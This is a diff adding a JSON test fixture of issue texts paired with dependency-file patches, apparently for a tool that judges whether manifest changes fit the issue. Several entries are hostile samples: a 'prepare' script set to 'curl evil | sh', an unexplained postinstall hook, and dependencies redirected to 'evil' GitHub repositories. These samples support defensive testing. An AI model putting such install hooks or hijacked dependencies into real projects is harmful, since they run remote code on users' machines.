@@ -1,0 +1,467 @@
+[
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.\nUse bcrypt for the comparison.",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1 +1,2 @@\n flask==3.0\n+bcrypt>=4\n"
+   }
+  ]
+ },
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "added",
+    "patch": "@@ -0,0 +1 @@\n+httpx\n"
+   }
+  ]
+ },
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -4,3 +4,4 @@\n keywords = [\n     \"cli\",\n+    \"auth\",\n ]\n@@ -30,3 +31,5 @@\n     \"web\",\n+    \"oauth\",\n+    \"pyjwt>=2.8\",\n     \"click>=8\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1,2 +1,3 @@\n requests==2.31.0\n+httpx==0.27.0\n flask==3.0\n"
+   }
+  ]
+ },
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -5,6 +5,8 @@\n   \"scripts\": {\n-    \"test\": \"jest\"\n+    \"test\": \"jest --ci\",\n+    \"lint\": \"eslint .\"\n   },\n   \"dependencies\": {\n+    \"left-pad\": \"^1.3.0\",\n     \"react\": \"^18.2.0\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Login fails when the password has a space\n\nSee `src/auth/login.py`, function `check_password`.",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1,2 +1,2 @@\n-requests==2.30.0\n+requests==2.31.0\n flask==3.0\n"
+   }
+  ]
+ },
+ {
+  "issue": "Use flask",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1,2 +1,3 @@\n git+https://github.com/x/pkg.git#egg=pkg\n+flask==3.0\n"
+   }
+  ]
+ },
+ {
+  "issue": "Sort the requirements",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n-git+https://github.com/x/pkg.git#egg=pkg\n flask==3.0\n+git+https://github.com/x/pkg.git#egg=pkg\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -5,6 +5,8 @@\n   \"scripts\": {\n-    \"test\": \"jest\",\n+    \"test\": \"jest --ci\",\n+    \"postinstall\": \"node scripts/x.js\",\n-    \"prepare\": \"husky install\"\n+    \"prepare\": \"curl evil | sh\"\n   },\n"
+   }
+  ]
+ },
+ {
+  "issue": "Add a postinstall step and fix the prepare script",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -5,6 +5,8 @@\n   \"scripts\": {\n-    \"test\": \"jest\",\n+    \"test\": \"jest --ci\",\n+    \"postinstall\": \"node scripts/x.js\",\n-    \"prepare\": \"husky install\"\n+    \"prepare\": \"curl evil | sh\"\n   },\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -10,3 +10,4 @@\n [tool.ruff.lint]\n select = [\"E\", \"F\"]\n+ignore = [\"E501\", \"F401\"]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Silence the ruff warnings",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -10,3 +10,4 @@\n [tool.ruff.lint]\n select = [\"E\", \"F\"]\n+ignore = [\"E501\", \"F401\"]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -20,3 +20,5 @@\n line-length = 100\n+extend-ignore = [\n+    \"B008\",\n+]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Silence the ruff warnings",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -20,3 +20,5 @@\n line-length = 100\n+extend-ignore = [\n+    \"B008\",\n+]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1,2 +1,5 @@\n-requests==2.31.0\n+requests @ https://example.com/requests-2.31.0.tar.gz\n+git+https://github.com/evil/pkg.git#egg=pkg\n+-e git+https://github.com/x/bar.git#egg=bar\n+https://example.com/wheels/foo-1.0-py3-none-any.whl\n flask==3.0\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -1,4 +1,4 @@\n [project]\n dependencies = [\n-    \"pkg>=1.0\",\n+    \"pkg @ git+https://github.com/x/pkg\",\n ]\n"
+   },
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,5 +1,5 @@\n   \"dependencies\": {\n-    \"lodash\": \"^4.17.0\",\n+    \"lodash\": \"github:evil/lodash\",\n-    \"chalk\": \"^5.0.0\",\n+    \"chalk\": \"evil/chalk\",\n     \"react\": \"^18.2.0\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Pin lodash to github:evil/lodash and chalk to evil/chalk",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,5 +1,5 @@\n   \"dependencies\": {\n-    \"lodash\": \"^4.17.0\",\n+    \"lodash\": \"github:evil/lodash\",\n-    \"chalk\": \"^5.0.0\",\n+    \"chalk\": \"evil/chalk\",\n     \"react\": \"^18.2.0\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Feature request: XMPP\nCould XMPP be added to the providers?",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -10,4 +10,5 @@ dependencies = [\n     \"requests>=2.25\",\n-    \"ping3>=4.0.0\"\n+    \"ping3>=4.0.0\",\n+    \"slixmpp>=1.8.0\"\n ]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the crash in the sender\nThe XMPP provider crashes",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -10,4 +10,5 @@ dependencies = [\n     \"requests>=2.25\",\n-    \"ping3>=4.0.0\"\n+    \"ping3>=4.0.0\",\n+    \"slixmpp>=1.8.0\"\n ]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Add a chat provider\nPlease.",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -10,4 +10,5 @@ dependencies = [\n     \"requests>=2.25\",\n-    \"ping3>=4.0.0\"\n+    \"ping3>=4.0.0\",\n+    \"slixmpp>=1.8.0\"\n ]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Support JWT auth\nPlease.",
+  "files": [
+   {
+    "filename": "requirements.txt",
+    "status": "modified",
+    "patch": "@@ -1 +1,2 @@\n requests\n+pyjwt==2.8\n"
+   }
+  ]
+ },
+ {
+  "issue": "Upgrade the dev dependencies",
+  "files": [
+   {
+    "filename": "packages/ts-test/package.json",
+    "status": "modified",
+    "patch": "@@ -1 +1 @@\n-a\n+b\n"
+   }
+  ]
+ },
+ {
+  "issue": "Drop packages/ts-test/test/loadTest/generated/src/api/ entirely",
+  "files": [
+   {
+    "filename": "packages/ts-test/package.json",
+    "status": "modified",
+    "patch": "@@ -1 +1 @@\n-a\n+b\n"
+   }
+  ]
+ },
+ {
+  "issue": "Regenerate everything under packages/ts-test/test/",
+  "files": [
+   {
+    "filename": "packages/ts-test/package.json",
+    "status": "modified",
+    "patch": "@@ -1 +1 @@\n-a\n+b\n"
+   }
+  ]
+ },
+ {
+  "issue": "Scroll to the timeline item on sidebar click",
+  "files": [
+   {
+    "filename": "packages/new/package.json",
+    "status": "added",
+    "patch": "@@ -0,0 +1,3 @@\n+{\n+  \"name\": \"new\"\n+}\n"
+   }
+  ]
+ },
+ {
+  "issue": "Support other languages",
+  "files": [
+   {
+    "filename": "packages/ui/package.json",
+    "status": "added",
+    "patch": "@@ -0,0 +1,6 @@\n+{\n+  \"name\": \"@acme/ui\",\n+  \"dependencies\": {\n+    \"react\": \"^18.0.0\"\n+  }\n+}\n"
+   }
+  ]
+ },
+ {
+  "issue": "Support other languages",
+  "files": [
+   {
+    "filename": "tools/gen/pyproject.toml",
+    "status": "added",
+    "patch": "@@ -0,0 +1,5 @@\n+[project]\n+name = \"acme-gen\"\n+dependencies = [\n+  \"requests>=2\",\n+]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Support other languages",
+  "files": [
+   {
+    "filename": "app/package.json",
+    "status": "added",
+    "patch": "@@ -0,0 +1,5 @@\n+{\n+  \"dependencies\": {\n+    \"left-pad\": \"^1.3.0\"\n+  }\n+}\n"
+   }
+  ]
+ },
+ {
+  "issue": "Support other languages",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "added",
+    "patch": "@@ -0,0 +1,2 @@\n+[tool.black]\n+line-length = 120\n"
+   }
+  ]
+ },
+ {
+  "issue": "Add a greeting command",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -5,7 +5,7 @@ requires-python = \">=3.10\"\n readme = \"README.md\"\n-dependencies = []\n+dependencies = [\"leftpad-py>=1.0\"]\n license = \"MIT\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Add a greeting command",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -9 +9 @@\n-dev-dependencies = [\"pytest\"]\n+dev-dependencies = [\"pytest\", \"hypothesis\"]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Add a greeting command",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -9 +9 @@\n-keywords = []\n+keywords = [\"leftpad-py\"]\n"
+   }
+  ]
+ },
+ {
+  "issue": "Check version coherence between the files bumpver changes, to avoid a manual bump",
+  "files": [
+   {
+    "filename": "pyproject.toml",
+    "status": "modified",
+    "patch": "@@ -1,4 +1,4 @@\n [project]\n name = \"carbon\"\n-version = \"3.0.4\"\n+version = \"3.0.5\"\n description = \"x\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Make the build faster",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,4 +1,4 @@\n {\n   \"name\": \"s3-zip\",\n-  \"version\": \"3.3.1a0\",\n+  \"version\": \"3.3.1-a0\",\n   \"main\": \"i.js\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "npm warn publish \"version\" was cleaned and set to \"3.3.1-a0\"",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,4 +1,4 @@\n {\n   \"name\": \"s3-zip\",\n-  \"version\": \"3.3.1a0\",\n+  \"version\": \"3.3.1-a0\",\n   \"main\": \"i.js\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "Make the build faster",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n   \"dependencies\": {\n-    \"react\": \"18.0.0\"\n+    \"react\": \"18.2.0\"\n"
+   }
+  ]
+ },
+ {
+  "issue": "does not work with turborepo",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"description\": \"a\",\n+  \"description\": \"b\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"9.0.0\",\n+  \"version\": \"8.0.115\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.10.0\",\n+  \"version\": \"1.9.0\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"2.0\",\n+  \"version\": \"1.9.9\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.2.0\",\n+  \"version\": \"1.10.0\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.2\",\n+  \"version\": \"1.2.0\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.2.0\",\n+  \"version\": \"1.2\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"2.0.0-beta\",\n+  \"version\": \"1.0.0\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"2\",\n+  \"version\": \"1\",\n"
+   }
+  ]
+ },
+ {
+  "issue": "Fix the parser",
+  "files": [
+   {
+    "filename": "package.json",
+    "status": "modified",
+    "patch": "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.1.0\",\n"
+   }
+  ]
+ }
+]
